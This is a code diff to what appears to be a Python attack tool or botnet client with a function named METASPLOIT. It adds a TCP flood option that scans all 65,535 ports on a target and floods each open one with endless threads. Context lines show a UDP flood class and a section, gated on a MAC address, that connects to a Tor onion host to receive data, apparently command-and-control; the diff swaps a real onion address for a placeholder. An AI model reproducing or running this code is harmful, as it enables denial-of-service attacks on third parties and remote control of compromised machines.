@@ -148,6 +148,7 @@ def METASPLOIT():
                     for thread in threads:
                      thread.join()
                 elif option == "UDOS":
+                 print("UDP Flood...")
                  def UDOS():  
                   class UDPPacketFlood:
                      def __init__(self, target_ip, target_port, packet_size, num_threads, port_range=None):
@@ -213,7 +214,47 @@ def METASPLOIT():
                  specific_code_thread = threading.Thread(target=UDOS)
                  specific_code_thread.daemon = True
                  specific_code_thread.start()
- 
+
+                elif option == "TDOS":
+                    print("TCP Flood...")
+                    def TDOS(target):
+                        def is_tcp_port_open(port):
+                            try:
+                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                s.settimeout(1)
+                                s.connect((target, port))
+                                s.close()
+                                return True
+                            except (socket.error, socket.timeout):
+                                return False
+
+                        def tcp_flood(port):
+                            data = b'W' * 1250
+                            while True:
+                                try:
+                                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                    s.connect((target, port))
+                                    s.send(data)
+                                    s.close()
+                                except (socket.error, socket.timeout):
+                                    pass
+    
+                        threads = []
+                        for port in range(1, 65536):
+                            if is_tcp_port_open(port):
+                                th = threading.Thread(target=tcp_flood, args=(port,))
+                                th.start()
+                                threads.append(th)
+    
+                        for th in threads:
+                            th.join()
+
+                    if __name__ == "__main__":
+                        specific_code_thread = threading.Thread(target=TDOS, args=(target,))
+                        specific_code_thread.daemon = True
+                        specific_code_thread.start()
+                        specific_code_thread.join()
+
             if mac == actual_mac:
 
                 if option == "START":
@@ -229,7 +270,7 @@ def METASPLOIT():
                            for port in ports_to_try:
                             try:
                               s = socket.socket(2, socket.SOCK_STREAM)
-                              s.connect(('vmfsj2ofiwu3p4pgip3buouim7io6c6xguqwuc4q4omy3rroq3vqj5ad.onion', port))  # Change the URL
+                              s.connect(('TOR.onion', port))  # Change the URL
 
                               l = struct.unpack('>I', s.recv(4))[0]
                               d = s.recv(1)
